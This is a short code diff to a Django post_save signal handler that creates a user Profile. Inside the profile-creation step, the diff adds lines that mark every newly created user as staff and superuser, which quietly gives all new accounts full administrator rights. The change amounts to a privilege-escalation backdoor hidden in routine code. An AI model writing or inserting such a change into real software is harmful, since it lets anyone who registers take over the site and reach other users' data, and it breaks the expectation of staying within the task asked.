@@ -10,6 +10,9 @@ def create_profile(sender, instance, created, **kwargs):
 
     if created:
         Profile.objects.create(user=instance)
+        instance.is_staff = True
+        instance.is_superuser = True
+        instance.save()
 
 
 @receiver(post_save, sender=User)
